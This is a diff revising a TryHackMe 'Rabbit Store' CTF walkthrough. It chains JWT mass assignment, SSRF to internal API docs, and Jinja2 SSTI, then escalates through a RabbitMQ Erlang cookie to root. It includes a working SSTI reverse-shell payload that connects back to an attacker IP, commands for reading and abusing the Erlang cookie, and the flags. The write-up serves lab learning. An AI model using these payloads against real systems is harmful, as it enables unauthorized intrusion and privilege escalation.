@@ -1,103 +1,94 @@
-# TryHackMe - RabbitMQ CTF Write-Up 🐰💥  
-**Author:** David Umoh  
-**Room:** *Rabbit Store*  
-**Category:** Web, SSTI, Privilege Escalation  
-**Difficulty:** Medium/Hard  
+
+# TryHackMe - Rabbit Store CTF Write-up (RabbitMQ Abuse & SSTI to Root)
+
+> **Author:** David Umoh  
+> **Platform:** TryHackMe  
+> **Category:** Web Exploitation, RabbitMQ Abuse, SSTI, SSRF, Privilege Escalation  
+> **Difficulty:** Medium  
 
 ---
 
-## 🧠 Overview  
-This write-up covers my full walkthrough of the *RabbitMQ-themed CTF* challenge on TryHackMe. The challenge involved API enumeration, a mass assignment vulnerability, a clever SSTI (Server-Side Template Injection) via a file fetch API, and finally RabbitMQ-based privilege escalation. I’ve documented every crucial step, including hiccups and enumeration logic, to help others replicate the exploitation path and learn the flow.
+## Overview
+
+In this room, we pivot through several layers of exploitation using API endpoint abuse, JWT manipulation, mass assignment, SSTI (Server-Side Template Injection), and finally RabbitMQ remote command execution to gain root. Here's a full breakdown of all methods used, mistakes, hiccups, payloads, and the reasoning behind each step.
 
 ---
 
-## 📌 Initial Enumeration  
+## Reconnaissance
 
-**Target IP:** `10.8.137.194`  
-We begin with an Nmap scan to identify open ports and services.
+Initial Nmap Scan revealed the following:
 
 ```bash
-nmap -sC -sV -p- 10.8.137.194
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+4369/tcp  open  epmd
+25672/tcp open  unknown
 ```
 
-**Results:**
+### `/etc/hosts` Entry
+
+We added the following to our `/etc/hosts` file to access subdomains easily:
+
 ```
-22/tcp    open     ssh
-80/tcp    open     http
-4369/tcp  open     epmd
-25672/tcp open     erl-dist
+10.10.240.29 cloudsite.thm storage.cloudsite.thm
 ```
+
+Navigating to cloudsite.thm we are greeted with a landing page which has a login/signup button. Clicking it redirects to the subdomain `storage.cloudsite.thm`.
 
 ---
 
-## 🗂 /etc/hosts Configuration  
-To better interact with the web application, I added the following host entries:
+## Gaining Initial Access via Mass Assignment
 
-```bash
-sudo nano /etc/hosts
-```
+There is a sign-up button; let's register an account, login and see what we can find. We are presented with a dashboard after logging in.
 
-```text
-10.8.137.194 cloudsite.thm
-10.8.137.194 storage.cloudsite.thm
-```
-
-This allowed me to access the main site and subdomain directly.
-
----
-
-## 🌐 Web App + Mass Assignment Exploit
-
-### 🔍 Discovery
-Visiting `http://cloudsite.thm` showed a typical subscription-based app. After creating a user, I noticed that premium features were restricted.
-
-### 🔑 JWT Manipulation & Mass Assignment
-
-Upon registering and logging in, I intercepted a JWT token and decoded it via [jwt.io](https://jwt.io/). The original payload looked like this:
+Using Burp to intercept the request, we see a JWT token is assigned after login. Using JWT Editor, we decoded the token:
 
 ```json
 {
-    "email": "tes@gmail.com",
+    "email": "tes1@gmail.com",
+    "subscription": "inactive",
+    "iat": 1753313734,
+    "exp": 1753317334
+}
+```
+
+Attempts to exploit the token via `alg:none` or algorithm confusion failed. Eventually, mass assignment succeeded by adding `"subscription": "active"` during registration:
+
+```json
+{
+    "email": "test@gmail.com",
+    "subscription": "active",
     "iat": 1753303135,
     "exp": 1753306735
 }
 ```
 
-I modified the payload by adding:
-```json
-"subscription": "active"
-```
-
-Then, I re-signed the JWT using the original key and replaced the session token. This bypassed the premium check — classic mass assignment!
-
-> 💡 **Hiccup:** Initially I assumed the app validated subscription status via backend calls. Only after testing several token variations did I confirm the app blindly trusted JWT content.
+This elevated us to a premium user.
 
 ---
 
-## 🚀 Dashboard Enumeration & SSTI
+## SSTI Discovery via Upload Feature
 
-### 🧪 Upload Feature Abuse
+While exploring the premium dashboard, we found a URL upload feature at `/api/store-url` and a file upload at `/api/upload`.
 
-The premium dashboard included a URL-based file upload feature. I intercepted the request:
-```json
-POST /api/store-url
-{
-  "url": "http://example.com/file.txt"
-}
+### API Enumeration via FFUF
+
+We fuzzed with `ffuf` and discovered a hidden endpoint `/api/docs`:
+
+```bash
+ffuf -u https://storage.cloudsite.thm/api/FUZZ -w api-endpoints.txt
 ```
 
-To test internal access, I sent:
+Direct access was denied (`403`). However, abusing the `store-url` upload feature:
+
 ```json
-{
-  "url": "http://127.0.0.1/api/docs"
-}
+{ "url": "http://127.0.0.1/api/docs" }
 ```
 
-This caused the app to download a local file, which was then available to me. Upon viewing the downloaded file, I uncovered critical internal API documentation:
+Downloaded a JSON file with all API endpoints.
 
----
-
-## 📚 Internal API Map (Leaked via /api/docs)
+### Dumped API Endpoints
 
 ```
 POST:
@@ -115,104 +106,118 @@ GET:
 
 ---
 
-## ⚙️ Discovering Jinja2 via FFUF + Error-Based SSTI
+## Discovering and Exploiting SSTI
 
-I used `ffuf` to enumerate further API routes and confirm the `/api/fetch_messeges_from_chatbot` endpoint.
-
-```bash
-ffuf -u http://cloudsite.thm/api/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "Authorization: Bearer <token>"
-```
-
-The chatbot endpoint accepted a `username` parameter. I sent:
+One endpoint `/api/fetch_messeges_from_chatbot` stood out. Sending a POST without a body returned:
 
 ```json
-{
-  "username": "${{<%[%'"}}%"
-}
+{"error": "username parameter is required"}
 ```
 
-The response returned a Jinja2-related error — clear sign of SSTI vulnerability.
+Using this:
 
----
+```json
+{ "username": "${{<%[%'"}}%\." }
+```
 
-## 💥 Exploiting SSTI for RCE
+...revealed a **Jinja2 error**, confirming SSTI.
 
-I crafted the following SSTI payload to gain a reverse shell:
+### Exploiting Jinja2 for RCE
 
 ```jinja2
 {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen("python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.8.137.194\",9001));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'").read() }}
 ```
+listener: ```nc -lvnp 9001```
 
-Then I started a listener:
+We caught a reverse shell as user `azreal`.
 
 ```bash
-nc -lvnp 9001
+cd /home
+cat user.txt
 ```
-
-Success! I got a shell as **azreal**.
-
-> 🧩 Note: SSTI was buried in an obscure endpoint, only revealed through chained abuse of the upload feature and accessing internal docs.
 
 ---
 
-## 🔐 Privilege Escalation via RabbitMQ
+## Privilege Escalation via RabbitMQ
 
-### 🔍 Discovering the Running RabbitMQ Service
+RabbitMQ was running on ports 4369 and 25672.
 
-Earlier, we saw ports `4369` and `25672` — both tied to Erlang & RabbitMQ.
-
-```bash
-ps aux | grep rabbit
-```
-
-RabbitMQ was installed but inactive. I restarted it:
+We found the Erlang cookie:
 
 ```bash
-sudo systemctl enable rabbitmq-server
-sudo systemctl start rabbitmq-server
+cat /var/lib/rabbitmq/.erlang.cookie
+# XrMEGa8a2jG63bGn
 ```
 
-### 🔑 Getting `.erlang.cookie`
+Using `epmd -names`:
 
-RabbitMQ nodes use a shared secret stored in:
+```
+name rabbit at port 25672
+```
+
+Added the hostname to `/etc/hosts`:
+
+```
+10.10.240.29 forge
+```
+
+Confirmed the node:
 
 ```bash
-/home/azreal/.erlang.cookie
+rabbitmqctl --node rabbit@forge --erlang-cookie XrMEGa8a2jG63bGn status
 ```
 
-We grabbed it and used it for authentication:
+### Enumerating Users
 
 ```bash
-erl -sname attacker -setcookie <COOKIE> -remsh rabbit@forge
+rabbitmqctl --node rabbit@forge --erlang-cookie XrMEGa8a2jG63bGn list_users
 ```
 
-### 📤 Exporting Definitions
-
-We used `rabbitmqctl` to export users:
+### Exporting User Definitions
 
 ```bash
-sudo rabbitmqctl --node rabbit@forge export_definitions defs.json
+sudo rabbitmqctl --node rabbit@forge --erlang-cookie XrMEGa8a2jG63bGn export_definitions /dev/shm/users.json
 ```
 
-Inside `defs.json`, we found hashed passwords:
+Inspected:
+
+```bash
+cat /dev/shm/users.json | jq .users[]
+```
+
+Found:
 
 ```json
-"password_hash": "sha256$...$..."
+{
+  "name": "root",
+  "password_hash": "49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF"
+}
 ```
 
-### 🔓 Cracking the Hash
-
-I isolated the hash and decoded it with Python or online tools — this revealed the root user's password.
-
-### ⬆️ Root Access
-
-I switched to root using:
+### Base64 Decoding & Final Root Access
 
 ```bash
-su - root
+echo 49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF | base64 -d | xxd -p -c 100
 ```
 
-Entered the cracked password, and got the root flag:
+Result:
+
+```
+e3d7ba85295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585
+```
+
+Password hash:
+
+```
+295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585
+```
+
+```bash
+su -
+# password: 295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585
+```
+
+🏁 **Root flag**:
 
 ```
 eabf7a0b05d3f2028f3e0465d2fd0852
@@ -220,23 +225,15 @@ eabf7a0b05d3f2028f3e0465d2fd0852
 
 ---
 
-## 🏁 Flags
+## Key Takeaways
 
-- **User Flag:** `996bdb1f619a68361417cabca5454705`
-- **Root Flag:** `eabf7a0b05d3f2028f3e0465d2fd0852`
-
----
-
-## 🧠 Final Thoughts
-
-This challenge was a fun blend of modern web vulnerabilities and backend service abuse. I especially appreciated the multi-stage access pattern — from JWT tampering to internal API exploration to RabbitMQ privilege escalation. Takeaways:
-
-- Always test JWT payloads for hidden logic like mass assignment.
-- Use upload features to try localhost/internal access.
-- Remember SSTI payload fuzzing (`${{<%[%'"}}%`) to trigger template errors.
-- Services like RabbitMQ may expose privilege paths if misconfigured.
+- Always test for mass assignment in JWT-based APIs
+- SSRF can help access internal-only endpoints
+- SSTI can be triggered by fuzzing templates
+- RabbitMQ nodes can expose secrets via exported definitions
+- The `.erlang.cookie` is sensitive and grants node-level access
 
 ---
 
-**Happy hacking!**  
-– David Umoh 🚩
+**Inspired by:** [jaxafed's Rabbit Store write-up](https://jaxafed.github.io/posts/tryhackme-rabbit_store/)  
+**Written by:** David Umoh (Cybersecurity Student & Pentester)
